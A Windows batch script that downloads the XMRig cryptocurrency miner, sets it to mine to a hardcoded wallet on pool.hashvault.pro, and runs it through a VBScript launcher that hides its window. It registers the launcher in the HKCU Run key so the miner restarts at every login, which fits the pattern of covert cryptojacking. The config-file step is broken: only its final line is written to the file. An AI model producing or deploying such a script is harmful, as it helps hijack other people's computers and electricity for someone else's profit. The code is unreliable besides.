@echo off
:: Ensure that the batch file is being run as Administrator
:: The following line will check if the script is running with elevated privileges (Administrator)
:: If not, it will restart the script with Administrator rights
NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
    echo This script requires Administrator privileges. Please run as Administrator.
    pause
    exit
)

:: Set Variables
set XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip
set INSTALL_PATH=C:\XMRig
set XMRIG_COMMAND=%INSTALL_PATH%\xmrig.exe -o pool.hashvault.pro:443 -u 497eo1Dedpzct417bUkoFDUoVnfLcmPjWY59cafBqtDrFC37EcqgyDQGh8FxiH52sQEyDeVy8NTWVQEu4cEYSzfe4wAoPWU -k --tls
set REG_KEY="HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: Step 1: Create XMRig Directory if it doesn't exist
echo Checking if C:\XMRig directory exists...
if not exist "%INSTALL_PATH%" (
    echo Creating XMRig directory at %INSTALL_PATH%...
    mkdir "%INSTALL_PATH%"
) else (
    echo XMRig directory already exists at %INSTALL_PATH%.
)

:: Step 2: Download and Extract XMRig
echo Downloading XMRig...
powershell -Command "Invoke-WebRequest -Uri %XMRIG_URL% -OutFile '%TEMP%\xmrig.zip'"
if %errorlevel% neq 0 (
    echo Failed to download XMRig. Please check your internet connection and try again.
    pause
    exit
)

echo Extracting XMRig...
powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%TEMP%\xmrig_extracted' -Force"
if %errorlevel% neq 0 (
    echo Failed to extract XMRig. Please check if the extraction path is correct and try again.
    pause
    exit
)

:: Step 3: Move Files to C:\XMRig
echo Moving files to %INSTALL_PATH%...
xcopy /E /H /K /Y "%TEMP%\xmrig_extracted\xmrig-6.20.0\*" "%INSTALL_PATH%\"
if %errorlevel% neq 0 (
    echo Failed to move XMRig files to %INSTALL_PATH%. Please check the process and try again.
    pause
    exit
)

:: Step 4: Create XMRig Configuration File
echo Creating XMRig configuration file...
echo {
echo     "autosave": true,
echo     "cpu": true,
echo     "opencl": false,
echo     "cuda": false,
echo     "pools": [
echo         {
echo             "url": "pool.hashvault.pro:443",
echo             "user": "497eo1Dedpzct417bUkoFDUoVnfLcmPjWY59cafBqtDrFC37EcqgyDQGh8FxiH52sQEyDeVy8NTWVQEu4cEYSzfe4wAoPWU",
echo             "keepalive": true,
echo             "tls": true
echo         }
echo     ]
echo } > "%INSTALL_PATH%\config.json"

:: Step 5: Create VBScript to Run XMRig Silently
echo Creating silent_launcher.vbs to run XMRig silently...
echo Set objShell = CreateObject("WScript.Shell") > "%INSTALL_PATH%\silent_launcher.vbs"
echo objShell.Run """%INSTALL_PATH%\xmrig.exe"" -o pool.hashvault.pro:443 -u 497eo1Dedpzct417bUkoFDUoVnfLcmPjWY59cafBqtDrFC37EcqgyDQGh8FxiH52sQEyDeVy8NTWVQEu4cEYSzfe4wAoPWU -k --tls", 0, False >> "%INSTALL_PATH%\silent_launcher.vbs"

:: Step 6: Add Registry Key for Startup
echo Adding registry key for startup...
reg add "%REG_KEY%" /v "XMRig" /t REG_SZ /d "%INSTALL_PATH%\silent_launcher.vbs" /f
if %errorlevel% neq 0 (
    echo Failed to add registry key. Please check your permissions and try again.
    pause
    exit
)

:: Step 7: Start XMRig in Background
echo Starting XMRig in the background...
start /B "" "%INSTALL_PATH%\silent_launcher.vbs"

:: Inform user that XMRig has been added to startup and is running
echo XMRig is now set to run on startup and is running silently in the background. You can continue to use your computer normally.

:: End of script
exit
